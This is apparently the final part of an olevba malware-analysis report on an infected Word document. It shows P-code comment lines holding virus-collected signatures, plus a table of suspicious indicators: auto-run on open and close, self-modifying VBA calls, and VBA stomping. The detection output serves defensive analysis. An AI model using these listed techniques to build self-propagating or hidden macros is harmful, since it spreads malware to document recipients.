' 	QuoteRem 0x0000 0x0020 " 11:08:22 - âòîðíèê, 18 äåê 2001"
' Line #1878:
' 	QuoteRem 0x0000 0x000B " Êèñëåíêîâà"
' Line #1879:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1880:
' Line #1881:
' Line #1882:
' Line #1883:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1884:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1885:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1886:
' 	QuoteRem 0x0000 0x0024 " 12:08:17 - âîñêðåñåíüå, 23 äåê 2001"
' Line #1887:
' 	QuoteRem 0x0000 0x0006 " fayer"
' Line #1888:
' 	QuoteRem 0x0000 0x0014 " aku@tanak-cakap.com"
' Line #1889:
' Line #1890:
' Line #1891:
' Line #1892:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1893:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1894:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1895:
' 	QuoteRem 0x0000 0x0020 " 16:32:16 - Tuesday, 27 Aug 2002"
' Line #1896:
' 	QuoteRem 0x0000 0x0015 " • Ian Ace Culallad •"
' Line #1897:
' 	QuoteRem 0x0000 0x0008 " IFONTOC"
' Line #1898:
' Line #1899:
' Line #1900:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

